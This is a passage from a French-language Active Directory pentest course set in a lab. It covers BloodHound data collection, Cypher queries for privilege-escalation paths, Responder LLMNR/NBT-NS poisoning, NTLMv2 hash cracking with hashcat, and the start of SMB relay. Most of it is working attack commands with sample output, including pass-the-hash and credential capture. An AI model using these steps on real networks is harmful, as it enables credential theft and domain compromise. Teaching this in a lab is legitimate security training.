  -p 'P@ssw0rd' \
  -dc dc01.sdv-m2.lab \
  -gc dc01.sdv-m2.lab \
  -c ALL \
  --zip \
  -ns 192.168.1.10 \
  -o exports/bloodhound/

# Explication des paramètres :
#   -d sdv-m2.lab          : domaine cible
#   -u jdoe                : utilisateur pour la collecte
#   -p 'P@ssw0rd'          : mot de passe
#   -dc dc01.sdv-m2.lab    : contrôleur de domaine
#   -gc dc01.sdv-m2.lab    : serveur de catalogue global
#   -c ALL                 : toutes les collectes disponibles
#   --zip                  : compresser les JSON en ZIP
#   -ns 192.168.1.10       : serveur DNS
#   -o exports/bloodhound/ : dossier de sortie

# ─── Sortie attendue ──────────────────────────────────────────────────────────
# Les lignes [+] indiquent la progression de la collecte étape par étape
[+] Connecting to LDAP server: dc01.sdv-m2.lab
[+] Found 1 domains
[+] Found 1 domains in the forest
[+] Found 2 computers
[+] Found 15 users
[+] Found 12 groups
[+] Found 0 trusts
[+] Found 0 sessions
[+] Done! Output written to exports/bloodhound/
[+] Zipping output...
[+] Archive: exports/bloodhound/20250528143000_bloodhound.zip

# ─── Avec authentification par hash NTLM ─────────────────────────────────────
# Alternative au mot de passe : utiliser un hash NTLM (format LM:HASH)
# --hashes 'LMHASH:NTHASH' : LM peut être vide (aad3b...), NT = hash réel
bloodhound-python -d sdv-m2.lab \
  -u jdoe \
  --hashes 'LMHASH:NTHASH' \
  -dc dc01.sdv-m2.lab \
  -c ALL \
  -ns 192.168.1.10 \
  -o exports/bloodhound/

# ─── Avec authentification Kerberos (ccache) ──────────────────────────────────
# KRB5CCNAME : variable d'environnement pointant vers un cache de ticket Kerberos
# --use-kcache : utilise le ticket existant au lieu du mot de passe
export KRB5CCNAME=/path/to/ticket.ccache
bloodhound-python -d sdv-m2.lab \
  -u jdoe \
  --use-kcache \
  -dc dc01.sdv-m2.lab \
  -c ALL \
  -ns 192.168.1.10 \
  -o exports/bloodhound/
```

**Explication des commandes :**
| Option | Rôle/Explication |
|--------|------------------|
| `-d sdv-m2.lab` | Domaine cible pour la collecte des données AD |
| `-u jdoe` | Compte utilisateur pour s'authentifier auprès de l'annuaire |
| `-p 'P@ssw0rd'` | Mot de passe en clair (déconseillé dans les scripts, utiliser des variables d'environnement) |
| `-dc dc01.sdv-m2.lab` | Nom DNS du contrôleur de domaine à interroger |
| `-gc dc01.sdv-m2.lab` | Serveur de catalogue global (nécessaire pour interroger toute la forêt) |
| `-c ALL` | Mode de collecte complet : users, groups, computers, sessions, ACLs, trusts, etc. |
| `--zip` | Compresse les fichiers JSON générés en une archive ZIP pour faciliter le transfert |
| `-ns 192.168.1.10` | Spécifie un serveur DNS (utile si la résolution DNS ne fonctionne pas) |
| `-o exports/bloodhound/` | Dossier de destination pour les fichiers collectés |
| `--hashes 'LMHASH:NTHASH'` | Authentification par hash NTLM au lieu du mot de passe (Pass-the-Hash) |
| `--use-kcache` | Utilise un ticket Kerberos existant (cache ccache) au lieu d'une authentification explicite |
| `export KRB5CCNAME=...` | Définit le chemin vers le fichier de cache de ticket Kerberos |

### 3.5 Importation dans BloodHound

```bash
# ─── Vérifier que Neo4j tourne ────────────────────────────────────────────────
# Vérifie l'état du service Neo4j avant de lancer BloodHound
sudo neo4j status
# Si Neo4j n'est pas lancé :
sudo neo4j start

# ─── Lancer BloodHound ────────────────────────────────────────────────────────
# & met BloodHound en arrière-plan pour libérer le terminal
/opt/BloodHound/BloodHound &
```

**Explication des commandes :**
| Commande | Rôle/Explication |
|----------|------------------|
| `sudo neo4j status` | Vérifie si le service Neo4j est actif avant d'importer les données |
| `sudo neo4j start` | Démarre Neo4j s'il n'est pas déjà lancé |
| `/opt/BloodHound/BloodHound &` | Lance l'interface graphique BloodHound en arrière-plan |

Une fois l'interface BloodHound ouverte :

1. Cliquer sur **"Upload Data"** (icône d'upload en haut à droite)
2. Sélectionner le fichier ZIP (ou les fichiers JSON individuels)
3. Attendre l'importation (barre de progression en haut)

**Vérification dans Neo4j (optionnel) :**

```bash
# ─── Vérifier que les données sont dans Neo4j ─────────────────────────────────
# Lance le shell interactif Cypher pour interroger la base de données graphe
# -u : utilisateur Neo4j  |  -p : mot de passe
cypher-shell -u neo4j -p bloodhound

# Requêtes Cypher à exécuter dans le shell :
# Compter les noeuds (tous les objets : users, groups, computers, etc.)
MATCH (n) RETURN count(n) AS node_count;
# Compter les relations (arêtes entre les noeuds : MemberOf, AdminTo, etc.)
MATCH ()-[r]->() RETURN count(r) AS rel_count;
# Lister les types de noeuds avec leur nombre (tri décroissant)
MATCH (n) RETURN labels(n) AS node_type, count(n) AS count ORDER BY count DESC;

# Sortie attendue :
# ╒════════════════╤═══════╕
# │node_type       │count  │
# ╞════════════════╪═══════╡
# │["User"]        │15     │
# │["Group"]       │12     │
# │["Computer"]    │2      │
# │["Domain"]      │1      │
# └────────────────┴───────┘

:exit
```

### 3.6 Requêtes BloodHound — Fondamentales

BloodHound utilise le langage **Cypher** pour interroger le graphe. Voici les requêtes pré-intégrées (via l'onglet "Analysis") et leurs équivalents Cypher.

#### Onglet Analysis → "Find all Domain Admins"

```cypher
MATCH (g:Group {name: 'DOMAIN ADMINS@SDV-M2.LAB'})
MATCH (u:User)
WHERE (u)-[:MemberOf*1..]->(g)
RETURN u.name, u.displayname
ORDER BY u.name
```

**Résultat attendu :**
```
╒═══════════════════════════╤══════════════════╕
│u.name                     │u.displayname     │
╞═══════════════════════════╪══════════════════╡
│"ADMINISTRATOR@SDV-M2.LAB" │"Administrateur"  │
│"JSMITH@SDV-M2.LAB"        │"John Smith"      │
└───────────────────────────┴──────────────────┘
```

#### Onglet Analysis → "Shortest Paths to High Value Targets"

```cypher
MATCH (n {highvalue:true})
MATCH (m)
WHERE m <> n AND NOT m.highvalue
MATCH p = shortestPath((m)-[*1..]->(n))
RETURN p
```

#### Onglet Analysis → "Find all Kerberoastable Users"

```cypher
MATCH (u:User {hasspn:true})
RETURN u.name, u.serviceprincipalnames
ORDER BY u.name
```

**Résultat attendu :**
```
╒════════════════════════════════╤══════════════════════════════╕
│u.name                          │u.serviceprincipalnames       │
╞════════════════════════════════╪══════════════════════════════╡
│"SVC_SQL@SDV-M2.LAB"           │["MSSQLSvc/sql01:1433"]      │
│"SVC_HTTP@SDV-M2.LAB"          │["HTTP/webapp.sdv-m2.lab"]   │
└────────────────────────────────┴──────────────────────────────┘
```

#### Onglet Analysis → "Find AS-REP Roastable Users (DontReqPreAuth)"

```cypher
MATCH (u:User {dontreqpreauth:true})
RETURN u.name, u.displayname
ORDER BY u.name
```

#### Onglet Analysis → "Users with most privileges"

```cypher
MATCH (u:User)
OPTIONAL MATCH (u)-[:MemberOf*1..]->(g:Group)
WITH u, COUNT(DISTINCT g) AS groupCount
OPTIONAL MATCH (u)-[:AdminTo]->(c:Computer)
WITH u, groupCount, COUNT(DISTINCT c) AS adminCount
RETURN u.name, groupCount, adminCount
ORDER BY groupCount DESC
```

### 3.7 Requêtes avancées — Custom Cypher

#### DCSync Rights

```cypher
// ─── DCSync Rights ──────────────────────────────────────────────────────────
// Recherche les entités avec les droits GetChanges/GetChangesAll

MATCH (n {domain: 'SDV-M2.LAB'})
MATCH (dc:Computer {domain: 'SDV-M2.LAB'})
WHERE dc.operatingsystem =~ '(?i).*server.*'
MATCH p = (n)-[r]->(dc)
WHERE r.IsACL = true AND (
  r.rights CONTAINS 'GetChanges' OR
  r.rights CONTAINS 'DS-Replication-Get-Changes'
)
RETURN n.name AS Who, type(r) AS Permission, dc.name AS Target
ORDER BY n.name
```

#### Users avec GenericAll sur des groupes privilégiés

```cypher
// ─── GenericAll sur groupes privilégiés ─────────────────────────────────────
// Permet d'ajouter un utilisateur à un groupe (abus : ajouter son compte aux admins)

MATCH (u:User)
MATCH (g:Group)
WHERE g.highvalue = true
MATCH p = (u)-[r:GenericAll]->(g)
RETURN u.name AS User, g.name AS TargetGroup, r.rights AS Rights
ORDER BY g.name
```

#### WriteDacl sur un objet

```cypher
// ─── WriteDacl ──────────────────────────────────────────────────────────────
// Permet de modifier les permissions d'un objet (escalade de privilèges)

MATCH (n {domain: 'SDV-M2.LAB'})
MATCH (m {domain: 'SDV-M2.LAB'})
MATCH p = (n)-[r:WriteDacl]->(m)
RETURN n.name AS WhoCanWrite, m.name AS Target, r.rights AS Rights
```

#### WriteOwner sur un objet

```cypher
// ─── WriteOwner ─────────────────────────────────────────────────────────────
// Permet de prendre possession d'un objet

MATCH (n {domain: 'SDV-M2.LAB'})
MATCH (m {domain: 'SDV-M2.LAB'})
MATCH p = (n)-[r:WriteOwner]->(m)
RETURN n.name AS WhoCanWriteOwner, m.name AS Target, r.rights AS Rights
```

#### Sessions actives

```cypher
// ─── Sessions actives sur les serveurs ──────────────────────────────────────
// Utile pour le Pass-the-Hash / Token impersonation

MATCH (c:Computer)-[:HasSession]->(u:User)
RETURN c.name AS Computer, u.name AS User
ORDER BY c.name
```

#### Chemins vers le domaine

```cypher
// ─── Tous les chemins avec 3+ trous ─────────────────────────────────────────
// Révèle les chemins d'attaque les plus longs (détection des ACL complexes)

MATCH (n:User)
MATCH (d:Domain {name: 'SDV-M2.LAB'})
MATCH p = shortestPath((n)-[*1..]->(d))
WHERE length(p) > 2
RETURN n.name AS StartingUser, length(p) AS PathLength, nodes(p) AS Path
ORDER BY PathLength DESC
```

#### Délégation Kerberos non contrainte

```cypher
// ─── Unconstrained Delegation ───────────────────────────────────────────────
// Permet de déléguer l'identité à n'importe quel service (très dangereux)

MATCH (c:Computer {unconstraineddelegation:true})
RETURN c.name AS ComputerWithDelegation, c.operatingsystem AS OS
```

#### Délégation Kerberos contrainte

```cypher
// ─── Constrained Delegation ─────────────────────────────────────────────────
MATCH (c:Computer)
WHERE c.allowedtodelegate IS NOT NULL
RETURN c.name AS Computer, c.allowedtodelegate AS AllowedDelegation
```

#### GPO applicables

```cypher
// ─── GPOs liés à des OU spécifiques ─────────────────────────────────────────
MATCH (gpo:GPO)-[:GpLink]->(ou:OU)
RETURN ou.name AS OU, gpo.name AS GPO, gpo.gpcfilesyspath AS Path
ORDER BY ou.name
```

#### Metsys' Ultimate Cypher Queries

```cypher
// ─── Trouver les principaux qui peuvent écrire des GPO ─────────────────────
MATCH p = (n)-[:GenericAll|WriteOwner|WriteDacl|AllExtendedRights]->(g:GPO)
RETURN n.name AS Principal, g.name AS GPO, type(r) AS Permission

// ─── Trouver les utilisateurs qui peuvent RDP sur des machines ─────────────
MATCH (u:User)-[:CanRDP]->(c:Computer)
RETURN u.name AS User, c.name AS Computer

// ─── Trouver les groupes Enterprise Admins (forêt) ────────────────────────
MATCH (g:Group {name: 'ENTERPRISE ADMINS@SDV-M2.LAB'})
MATCH (u:User)-[:MemberOf]->(g)
RETURN u.name AS EnterpriseAdmin

// ─── Lister les relations de confiance identifiées ──────────────────────────
MATCH (n:Domain)-[r:TrustedBy|HasTrust]->(m:Domain)
RETURN n.name AS Source, type(r) AS TrustType, m.name AS Target
```

### 3.8 Analyse via BloodHound — Workflow

#### Étape 1 : Marquer les High Value Targets

BloodHound marque automatiquement :
- **Domain Admins**
- **Enterprise Admins**
- **Domain Controllers**
- **Administrator**

Marquer manuellement : clic droit → **"Mark as High Value"**

#### Étape 2 : Requêtes "Outbound Control Rights"

BloodHound → Analysis → **"Outbound Control Rights"**
- Montre quels objets ont des droits de contrôle sur d'autres objets
- Identifie les relations ACL abusables

#### Étape 3 : Requêtes "Shortest Paths"

BloodHound → Analysis → **"Shortest Paths to High Value Targets"**
- Carte la route la plus rapide pour chaque noeud utilisateur vers un noeud High Value
- Permet de prioriser les attaques

#### Étape 4 : Export du graphe

```bash
# ─── Export de l'analyse BloodHound en image ─────────────────────────────────
# L'interface BloodHound vous permet de :
# 1. Zoomer sur le chemin d'attaque souhaité
# 2. Appuyer sur Ctrl+S (ou Fichier → Export Graph)
# 3. Choisir le format : PNG, SVG, GRAPHML, CSV

# Pour un export programmatique, utilisez Cypher vers Neo4j :
# Exporte tous les nœuds avec leur type et statut highvalue
# cypher-shell exécute une requête Cypher directement (sans mode interactif)
cypher-shell -u neo4j -p bloodhound \
  "MATCH (n) RETURN n.name, labels(n), n.highvalue" \
  > exports/bloodhound/nodes.csv

# Exporte toutes les relations (arêtes) entre nœuds avec leur type
# startNode(r).name et endNode(r).name donnent les noms des nœuds source et cible
cypher-shell -u neo4j -p bloodhound \
  "MATCH ()-[r]->() RETURN type(r), startNode(r).name, endNode(r).name" \
  > exports/bloodhound/edges.csv
```

**Explication des commandes :**
| Commande | Rôle/Explication |
|----------|------------------|
| `cypher-shell -u neo4j -p bloodhound "..." > nodes.csv` | Exécute une requête Cypher depuis le shell et sauvegarde le résultat en CSV |
| `MATCH (n) RETURN n.name, labels(n), n.highvalue` | Cypher : retourne le nom, le type (User/Group/Computer) et le statut haute valeur |
| `MATCH ()-[r]->() RETURN type(r), startNode(r).name, endNode(r).name` | Cypher : liste toutes les relations avec les noms des nœuds source et cible |

### 3.9 TP Guidé — BloodHound complet

#### Contexte

Vous avez compromis un poste utilisateur sur le domaine `sdv-m2.lab`. Depuis ce poste, vous devez :
1. Collecter les données AD avec SharpHound
2. Importer dans BloodHound
3. Analyser les chemins d'attaque
4. Identifier les comptes Kerberoastables

#### Étape 1 : Collecte

```bash
# ─── Depuis votre Kali (si accès réseau au DC) ────────────────────────────────
# Crée le dossier de sortie pour les données BloodHound du TP
mkdir -p exports/bloodhound-lab

# Collecte complète avec bloodhound-python
bloodhound-python -d sdv-m2.lab \
  -u jdoe -p 'P@ssw0rd' \
  -dc dc01.sdv-m2.lab \
  -gc dc01.sdv-m2.lab \
  -c ALL \
  -ns 192.168.1.10 \
  --zip \
  -o exports/bloodhound-lab/

# Vérifie que le fichier ZIP a bien été généré
ls -la exports/bloodhound-lab/*.zip
```

**Explication des commandes :**
| Commande/Option | Rôle/Explication |
|----------------|------------------|
| `mkdir -p exports/bloodhound-lab` | Crée le dossier de sortie pour les fichiers collectés |
| `bloodhound-python ... -c ALL --zip` | Collecte exhaustive avec compression ZIP |
| `ls -la exports/bloodhound-lab/*.zip` | Vérifie la présence et la taille du fichier ZIP généré |

#### Étape 2 : Configuration de Neo4j

```bash
# ─── Arrêt de Neo4j s'il tournait ────────────────────────────────────────────
# Arrête Neo4j avant de modifier sa configuration (nécessite un restart)
sudo neo4j stop

# ─── Configuration mémoire (optionnel pour grosses collectes) ─────────────────
# sed -i modifie le fichier neo4j.conf en place
# s/#dbms.../dbms.../ : remplace la ligne commentée par la ligne active
# Ces paramètres augmentent la mémoire allouée à Neo4j pour traiter de gros graphes
sudo sed -i 's/#dbms.memory.heap.initial_size=512m/dbms.memory.heap.initial_size=2048m/' /etc/neo4j/neo4j.conf
sudo sed -i 's/#dbms.memory.heap.max_size=1G/dbms.memory.heap.max_size=4G/' /etc/neo4j/neo4j.conf
sudo sed -i 's/#dbms.memory.pagecache.size=10m/dbms.memory.pagecache.size=2g/' /etc/neo4j/neo4j.conf

# Redémarre Neo4j avec la nouvelle configuration
sudo neo4j start
# Pause de 5 secondes pour laisser le temps à Neo4j de démarrer
sleep 5
# Vérifie que Neo4j est bien actif après la modification
sudo neo4j status
```

**Explication des commandes :**
| Commande | Rôle/Explication |
|----------|------------------|
| `sudo neo4j stop` | Arrête le service Neo4j avant les modifications de configuration |
| `sudo sed -i 's/.../.../' /etc/neo4j/neo4j.conf` | Utilise sed pour modifier le fichier de configuration Neo4j en place (-i = in-place) |
| `dbms.memory.heap.initial_size=2048m` | Taille initiale du heap Java (mémoire allouée au démarrage) : 2 Go |
| `dbms.memory.heap.max_size=4G` | Taille maximale du heap Java : 4 Go (important pour les gros domaines) |
| `dbms.memory.pagecache.size=2g` | Cache de pages Neo4j (stocke les nœuds/relations en mémoire) : 2 Go |
| `sleep 5` | Attend 5 secondes pour laisser Neo4j initialiser ses services |
| `sudo neo4j status` | Vérifie que Neo4j a bien redémarré avec la nouvelle configuration |

#### Étape 3 : Import et analyse

```bash
# ─── Lancement de BloodHound ─────────────────────────────────────────────────
# Ouvre l'interface graphique BloodHound pour l'analyse des données
/opt/BloodHound/BloodHound &

# 1. Connexion à Neo4j (bolt://localhost:7687 - neo4j:bloodhound)
# 2. Upload du fichier ZIP collecté
# 3. Naviguer vers l'onglet "Analysis"
```

**Explication des commandes :**
| Commande | Rôle/Explication |
|----------|------------------|
| `/opt/BloodHound/BloodHound &` | Lance l'interface BloodHound en arrière-plan pour l'analyse des données collectées |
| `&` | Place le processus en arrière-plan, libérant le terminal |

#### Étape 4 : Requêtes à effectuer

```bash
# ─── Dans l'onglet Analysis, exécutez dans l'ordre : ──────────────────────────
#
# 1. "Find all Domain Admins"
#    → Identifier qui peut controller le domaine
#
# 2. "Shortest Paths to High Value Targets"
#    → Voir le chemin de votre utilisateur actuel vers les DA
#
# 3. "Find all Kerberoastable Users"
#    → Identifier les comptes de service vulnérables
#
# 4. "Find Computers where Domain Users are Local Admin"
#    → Voir les serveurs où Domain Users a des droits
#
# 5. "Find all AS-REP Roastable Users"
#    → Comptes sans pré-authentification
#
# 6. Requêtes custom :
#    - DCSync rights
#    - GenericAll / WriteDacl sur groupes
#    - Délégation non contrainte
```

#### Étape 5 : Documenter les findings

```bash
# ─── Génération d'un rapport BloodHound ──────────────────────────────────────
cat > exports/bloodhound-report.md << 'EOF'
# BloodHound Analysis Report — sdv-m2.lab

## 1. High Value Targets
### Domain Admins
- ADMINISTRATOR@SDV-M2.LAB
- JSMITH@SDV-M2.LAB

### Enterprise Admins
- ADMINISTRATOR@SDV-M2.LAB

## 2. Kerberoastable Users
| User | SPN |
|------|-----|
| svc_sql | MSSQLSvc/sql01:1433 |
| svc_http | HTTP/webapp.sdv-m2.lab |

## 3. AS-REP Roastable
| User | Reason |
|------|--------|
| (none found) | Bien configuré |

## 4. Critical ACLs
| Source | Permission | Target |
|--------|------------|--------|
| jdoe | GenericAll | svc_sql |
| IT_Group | WriteDacl | Domain Admins |

## 5. Unconstrained Delegation
| Computer | OS |
|----------|----|
| dc01.sdv-m2.lab | Windows Server 2022 |
EOF
```

---

## 4. Responder — Empoisonnement LLMNR/NBT-NS

### 4.1 Présentation

**Responder** est un outil mythique de la suite Python qui permet d'**empoisonner** les protocoles de résolution de noms Windows (LLMNR, NBT-NS, MDNS) pour capturer des hashs NTLMv2.

**Principe :**
1. Un client Windows tente d'accéder à une ressource (ex: `\\serveur\partage`)
2. Si le nom DNS n'est pas résolu, Windows envoie une requête **LLMNR** ou **NBT-NS** sur le réseau local
3. Responder répond en se faisant passer pour le serveur demandé
4. Le client envoie son hash NTLMv2 pour s'authentifier
5. Responder capture le hash pour craquage offline (hashcat) ou relay (SMB Relay)

**Technique MITRE ATT&CK : T1557 — Man-in-the-Middle / LLMNR/NBT-NS Poisoning**

### 4.2 Installation

```bash
# ─── Installation via git (recommandé, version la plus récente) ───────────────
# Clone le dépôt officiel de Responder dans /opt/Responder
git clone https://github.com/lgandx/Responder /opt/Responder

# ─── Vérification ─────────────────────────────────────────────────────────────
# Liste le contenu du dossier pour confirmer la présence des fichiers essentiels
ls /opt/Responder/
# Sortie attendue :
# Responder.py       ← Script principal
# Responder.conf     ← Fichier de configuration
# tools/             ← Utilitaires additionnels
#   MultiRelay.py    ← SMB Relay tool
#   RunFinger.py     ← Fingerprinting hosts
# settings.py        ← Configuration Python

# ─── Installation des dépendances ─────────────────────────────────────────────
# Installe les bibliothèques Python nécessaires au fonctionnement de Responder
pip install -r /opt/Responder/requirements.txt

# ─── Installation via apt (Kali inclut Responder par défaut) ──────────────────
# Alternative : installation via le gestionnaire de paquets système
sudo apt update && sudo apt install -y responder

# ─── Vérification de l'installation ───────────────────────────────────────────
# Vérifie que Responder est accessible et affiche sa version
responder --version
```

**Explication des commandes :**
| Commande | Rôle/Explication |
|----------|------------------|
| `git clone ... /opt/Responder` | Clone le dépôt Git (contient la dernière version avec les correctifs) |
| `ls /opt/Responder/` | Vérifie que tous les fichiers ont bien été clonés |
| `pip install -r requirements.txt` | Installe les dépendances Python listées dans requirements.txt |
| `sudo apt update && sudo apt install -y responder` | Installation via APT (version parfois plus ancienne mais intégrée au système) |
| `responder --version` | Confirme que Responder est dans le PATH et prêt à être utilisé |

### 4.3 Configuration (Responder.conf)

Le fichier `Responder.conf` permet de configurer finement le comportement de Responder.

```bash
# ─── Ouvrir le fichier de configuration ───────────────────────────────────────
# nano : éditeur de texte en ligne de commande pour modifier Responder.conf
nano /opt/Responder/Responder.conf
```

**Explication des commandes :**
| Commande | Rôle/Explication |
|----------|------------------|
| `nano /opt/Responder/Responder.conf` | Ouvre le fichier de configuration Responder dans l'éditeur nano pour modification |

**Structure du fichier :**

```ini
[Responder Core]
; ─── Interface de réponse ───
; Serveurs auxquels Responder va répondre
SQL = On
FTP = On
SMTP = On
POP3 = On
IMAP = On
HTTP = On
HTTPS = On
DNS = On
LDAP = On
SMB = On
Kerberos = On
MSSQL = On
; ⚠️ Si vous relayez SMB (MultiRelay), désactivez SMB = On
; et utilisez l'option `-r` ou le mode relay

; ─── Options générales ───
Challenge = Random        ; Défi NTLM (Random = aléatoire, ou fixe)
                           ; Si fixe = permet le rainbow table
                           ; Valeur hexadécimale : 1122334455667788

; ─── Mode serveur HTTP/HTTPS ───
WPAD = On                 ; Serveur WPAD (Web Proxy Auto-Discovery)
                           ; Redirige le trafic navigateur vers Responder
WPADPort = 3141           ; Port du serveur WPAD

; ─── Mode serveur SMB ───
SMBPort = 445             ; Port SMB

; ─── Options de sortie ───
LogDir = /usr/share/responder/logs/   ; Dossier des logs
```

```bash
# ─── Configuration pratique pour un engagement ───────────────────────────────
# Désactiver SMB si on veut uniquement capturer sans relayer
# Car SMB = On peut causer des refus de connexion côté client
# Utiliser sed pour modifier la configuration sans ouvrir l'éditeur :
# sed -i 's/SMB = On/SMB = Off/' /opt/Responder/Responder.conf

# Activer WPAD si l'objectif est aussi la capture de proxy
# WPAD = On dans Responder.conf active le serveur WPAD intégré
```

**Explication des commandes :**
| Directive | Rôle/Explication |
|-----------|------------------|
| `SMB = Off` | Désactive le serveur SMB de Responder (nécessaire pour le mode relay, évite les conflits de port) |
| `WPAD = On` | Active le serveur WPAD (Web Proxy Auto-Discovery) pour capturer les hashs via le navigateur |
| `sed -i 's/SMB = On/SMB = Off/' ...` | Commande sed pour modifier automatiquement la configuration sans éditeur interactif |

### 4.4 Utilisation de base

```bash
# ─── Syntaxe ──────────────────────────────────────────────────────────────────
# Affiche le manuel d'utilisation complet de Responder
python3 /opt/Responder/Responder.py -h

# Options principales :
#   -I <interface>    Interface réseau (eth0, wlan0, tun0, etc.)
#   -i <IP>          Adresse IP de l'interface (par défaut : auto)
#   -e <IP>          Adresse IP du serveur WPAD (par défaut : -i)
#   -r <IP>          Activer le relay SMB après la capture
#   -d               Activer le mode DHCP (empoisonnement DHCP)
#   -w               Activer le serveur WPAD
#   -f               Fingerprint (RunFinger) : analyse OS des hôtes
#   -v               Mode verbose (affiche les requêtes détaillées)
#   -A               Mode analyse uniquement (sans répondre)
#   -F               Forcer l'authentification NTLM même si l'hôte
#                     ne supporte pas
```

**Explication des options :**
| Option | Rôle/Explication |
|--------|------------------|
| `-I <interface>` | Interface réseau sur laquelle Responder écoute (ex: eth0, wlan0, tun0 VPN) |
| `-i <IP>` | Adresse IP de l'interface (par défaut : détection automatique) |
| `-e <IP>` | Adresse IP du serveur WPAD (par défaut : même IP que -i) |
| `-r` | Active le SMB Relay après la capture du hash |
| `-d` | Mode DHCP poisoning (très agressif, peut causer des dénis de service) |
| `-w` | Active le serveur WPAD (Web Proxy Auto-Discovery) |
| `-f` | Fingerprint des hôtes (RunFinger) : analyse du système d'exploitation |
| `-v` | Mode verbose : affiche tous les paquets et requêtes en détail |
| `-A` | Mode analyse uniquement (écoute passive sans répondre aux requêtes) |
| `-F` | Force l'authentification NTLM même si l'hôte ne supporte pas le challenge |

```bash
# ─── Mode standard : capture LLMNR + NBT-NS + MDNS ────────────────────────────
# Lance Responder sur eth0 avec WPAD activé (-w) et sortie verbose (-v)
# sudo nécessaire car l'écoute réseau nécessite les privilèges root
sudo python3 /opt/Responder/Responder.py -I eth0 -w -v

# ─── Mode avec WPAD (détection proxy automatique) ─────────────────────────────
# Active le serveur WPAD pour intercepter les requêtes de découverte de proxy
sudo python3 /opt/Responder/Responder.py -I eth0 -w

# ─── Mode seulement analyse (écoute sans répondre) ────────────────────────────
# -A : mode analyse passive (ne répond pas aux requêtes, écoute uniquement)
# Utile pour évaluer le trafic LLMNR/NBT-NS sans déclencher d'alerte
sudo python3 /opt/Responder/Responder.py -I eth0 -A

# ─── Mode avec DHCP (empoisonnement DHCP) ─────────────────────────────────────
# -d : DHCP poisoning (l'attaquant répond aux requêtes DHCP avec ses propres infos)
# ⚠️ Mode très agressif qui peut causer des perturbations réseau
sudo python3 /opt/Responder/Responder.py -I eth0 -d -w
```

**Explication des commandes :**
| Commande | Rôle/Explication |
|----------|------------------|
| `sudo python3 /opt/Responder/Responder.py -I eth0 -w -v` | Mode standard avec WPAD et sortie détaillée (recommandé pour la plupart des engagements) |
| `-I eth0` | Interface réseau = eth0 (l'interface connectée au réseau local de la cible) |
| `-w` | Active le serveur WPAD (interception des requêtes de proxy automatique) |
| `-v` | Mode verbose (affiche chaque paquet reçu, utile pour le débogage) |
| `-A` | Mode analyse passive (écoute sans empoisonner, utile pour la reconnaissance) |
| `-d` | DHCP poisoning (répond aux requêtes DHCP, très intrusif) |

### 4.5 Sortie typique

Lorsqu'une requête est interceptée, Responder affiche :

```
[+] Listening for events... [LLMNR] [NBT-NS] [MDNS] [HTTP] [SMB]

[*] [LLMNR] Poisoned answer sent to 192.168.1.20 for name SERVEUR-PARTAGE
[*] [MDNS] Poisoned answer sent to 192.168.1.20 for name serveur-partage.local
[*] [LLMNR] Poisoned answer sent to 192.168.1.20 for name wpad

[HTTP] NTLMv2 Client   : 192.168.1.20
[HTTP] NTLMv2 Username : SDV-M2\jdoe
[HTTP] NTLMv2 Hash     : jdoe::SDV-M2:1122334455667788:2C9F3B8F0F0B1A...
```

Si un hash est capturé, Responder écrit dans un fichier de log :

```
[*] [HTTP] NTLMv2 hash captured from 192.168.1.20
[*] Sending NTLMv2 hash to logs/SMB-NTLMv2-192.168.1.20.txt
```

**Format du hash NTLMv2 :**

```
jdoe::SDV-M2:1122334455667788:2C9F3B8F0F0B1A2B3C4D5E6F7A8B9C0D:0101000000000000C0653150DEAAEFBBE47
```

**Structure :**
```
USERNAME::DOMAIN:CHALLENGE:NTProofStr:HMAC-SHA256(blob)+blob
│         │       │         │          │
│         │       │         │          └── Proof string + timestamp + nonce
│         │       │         └── NT proof (réponse HMAC)
│         │       └── Challenge (8 bytes hex)
│         └── Domain NetBIOS
└── Username
```

### 4.6 Craquage des hashs avec Hashcat

```bash
# ─── Format de hash NTLMv2 pour Hashcat ──────────────────────────────────────
# Mode hashcat pour NTLMv2 = 5600 (format standard pour les hashs capturés par Responder)

# ─── Sauvegarder le hash dans un fichier ─────────────────────────────────────
# echo écrit le hash NTLMv2 dans un fichier texte pour le craquage
echo 'jdoe::SDV-M2:1122334455667788:2C9F3B8F0F0B1A2B3C4D5E6F7A8B9C0D:0101000000000000C0653150DEAAEFBBE47' > hash.txt

# ─── Craquage avec Hashcat ───────────────────────────────────────────────────
# -m 5600 : mode NTLMv2  |  -a 0 : attaque par dictionnaire (wordlist)
# --force : ignore les avertissements (drivers compatibles non optimaux)
hashcat -m 5600 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --force

# Avec règles (OneRuleToRuleThemAll) :
# -r : fichier de règles de transformation de mots de passe (mutations)
# Les règles ajoutent des variations : majuscules, chiffres, symboles, etc.
hashcat -m 5600 -a 0 hash.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule --force

# ─── Craquage par brute force (8 caractères minuscules) ──────────────────────
# -a 3 : attaque par masque (brute force)
# '?l?l?l?l?l?l?l?l' : 8 lettres minuscules (26^8 combinaisons)
hashcat -m 5600 -a 3 hash.txt '?l?l?l?l?l?l?l?l' --force

# ─── Affichage des mots de passe craqués ─────────────────────────────────────
# --show : affiche les hashs qui ont été craqués (sans recraquer)
hashcat -m 5600 --show hash.txt

# Sortie attendue :
# jdoe::SDV-M2:1122334455667788:...:P@ssw0rd
```

**Explication des commandes :**
| Option | Rôle/Explication |
|--------|------------------|
| `-m 5600` | Mode hashcat pour hash NTLMv2 (format capturé par Responder) |
| `-a 0` | Attaque par dictionnaire (compare le hash à chaque mot de la wordlist) |
| `-a 3` | Attaque par masque (brute force) utilisant un pattern de caractères |
| `--force` | Ignore les avertissements de compatibilité (utile dans une VM) |
| `-r <fichier.rule>` | Applique des règles de transformation (ex: OneRuleToRuleThemAll) |
| `--show` | Affiche les résultats déjà craqués (sans relancer l'attaque) |
| `'?l?l?l?l?l?l?l?l'` | Masque : 8 caractères minuscules (?l = a-z) |
| `rockyou.txt` | Wordlist populaire contenant des millions de mots de passe réels |

### 4.7 SMB Relay avec Responder

Le relais SMB permet de ne pas craquer le hash, mais de l'utiliser directement pour s'authentifier sur d'autres serveurs.

**Principe :**
1. Responder capture le hash NTLMv2
2. Au lieu de stocker le hash, il le relaie (rejoue) immédiatement vers une cible
3. Si la cible accepte l'authentification, l'attaquant obtient un accès

**Prérequis :**
- Désactiver `SMB = On` dans `Responder.conf`
- Identifier une cible avec SMB signing désactivé
- Disposer des droits de l'utilisateur dont le hash est relayé

```bash
# ─── Étape 1 : Désactiver SMB dans Responder.conf ────────────────────────────
# sed -i modifie le fichier en place : remplace "SMB = On" par "SMB = Off"
sed -i 's/SMB = On/SMB = Off/' /opt/Responder/Responder.conf
# grep vérifie la modification (^SMB = début de ligne contenant "SMB")
